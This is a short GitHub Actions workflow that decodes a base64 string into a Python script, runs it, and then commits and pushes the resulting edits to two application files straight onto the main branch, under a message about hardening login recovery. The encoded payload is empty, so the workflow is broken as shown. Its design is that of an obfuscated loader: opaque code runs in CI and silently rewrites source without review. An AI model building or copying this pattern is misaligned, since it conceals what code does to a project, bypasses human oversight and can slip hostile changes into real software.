name: One-time Runtime Hardening

on:
  push:
    branches: [main]

permissions:
  contents: write

jobs:
  patch:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          token: ${{ secrets.GITHUB_TOKEN }}

      - name: Apply runtime fixes
        shell: bash
        run: |
          printf '%s' '' | base64 -d > /tmp/runtime-hardening.py
          python3 /tmp/runtime-hardening.py
          node --check backend/src/server.js

      - name: Commit runtime fixes
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add frontend/App.js backend/src/server.js
          if git diff --cached --quiet; then
            echo "No runtime hardening changes to commit."
            exit 0
          fi
          git commit -m "fix(runtime): harden login recovery and price alert polling"
          git push origin HEAD:main
